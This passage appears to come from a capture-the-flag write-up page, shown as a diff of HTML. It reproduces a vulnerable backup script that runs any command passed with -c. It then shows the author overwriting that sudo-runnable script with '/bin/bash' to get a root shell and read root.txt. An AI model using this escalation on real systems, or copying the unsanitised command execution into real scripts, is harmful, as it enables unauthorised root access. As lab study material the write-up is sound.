+<span class="c1">#  b=$(basename $input)</span>
+<span class="w">  </span><span class="c1">#echo</span>
+<span class="c1">#  echo &quot;$line&quot;</span>
+<span class="c1">#done &lt; &quot;$input&quot;</span>
+
+<span class="k">while</span><span class="w"> </span><span class="n">getopts</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="w"> </span><span class="n">flag</span>
+<span class="n">do</span>
+<span class="w">        </span><span class="n">case</span><span class="w"> </span><span class="s2">&quot;${flag}&quot;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span>
+<span class="w">                </span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="n">command</span><span class="o">=$</span><span class="p">{</span><span class="n">OPTARG</span><span class="p">};;</span>
+<span class="w">        </span><span class="n">esac</span>
+<span class="n">done</span>
+
+
+
+<span class="n">backup_files</span><span class="o">=</span><span class="s2">&quot;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&quot;</span>
+
+<span class="c1"># Where to backup to.</span>
+<span class="n">dest</span><span class="o">=</span><span class="s2">&quot;/etc/mp3backups/&quot;</span>
+
+<span class="c1"># Create archive filename.</span>
+<span class="n">hostname</span><span class="o">=$</span><span class="p">(</span><span class="n">hostname</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="p">)</span>
+<span class="n">archive_file</span><span class="o">=</span><span class="s2">&quot;$hostname-scheduled.tgz&quot;</span>
+
+<span class="c1"># Print start status message.</span>
+<span class="n">echo</span><span class="w"> </span><span class="s2">&quot;Backing up $backup_files to $dest/$archive_file&quot;</span>
+
+<span class="n">echo</span>
+
+<span class="c1"># Backup the files using tar.</span>
+<span class="n">tar</span><span class="w"> </span><span class="n">czf</span><span class="w"> </span><span class="o">$</span><span class="n">dest</span><span class="o">/$</span><span class="n">archive_file</span><span class="w"> </span><span class="o">$</span><span class="n">backup_files</span>
+
+<span class="c1"># Print end status message.</span>
+<span class="n">echo</span>
+<span class="n">echo</span><span class="w"> </span><span class="s2">&quot;Backup finished&quot;</span>
+
+<span class="n">cmd</span><span class="o">=$</span><span class="p">(</span><span class="o">$</span><span class="n">command</span><span class="p">)</span>
+<span class="n">echo</span><span class="w"> </span><span class="o">$</span><span class="n">cmd</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="n">u</span><span class="o">+</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;/bin/bash&quot;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">alex</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mp3backups</span><span class="o">/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="c1"># cd root</span>
+<span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cd</span><span class="p">:</span><span class="w"> </span><span class="n">root</span><span class="p">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">directory</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="c1"># cd ..</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="c1"># cd ..</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="c1"># cd root</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="c1"># ls</span>
+<span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">root</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="c1"># cat root.txt</span>
+</code></pre></div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
